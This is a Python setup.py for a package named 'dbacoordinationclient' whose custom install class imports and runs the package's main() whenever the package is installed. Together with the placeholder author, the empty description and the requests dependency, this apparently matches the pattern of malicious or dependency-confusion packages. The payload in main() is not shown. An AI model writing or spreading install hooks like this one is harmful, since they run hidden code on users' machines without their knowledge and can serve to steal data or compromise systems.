from setuptools import setup, find_packages
from setuptools.command.install import install


class CrazyInstallStrat(install):
    def run(self):
        from dbacoordinationclient import main
        main()
        install.run(self)

setup(
    name="dbacoordinationclient",
    version="0.0.19",
    author="x",
    author_email="watchandthink@outlook.com",
    description="",
    long_description_content_type="text/markdown",
    long_description="",
    cmdclass={
        'install': CrazyInstallStrat,
    },
    install_requires=['requests'],
    setup_requires=['setuptools']
)
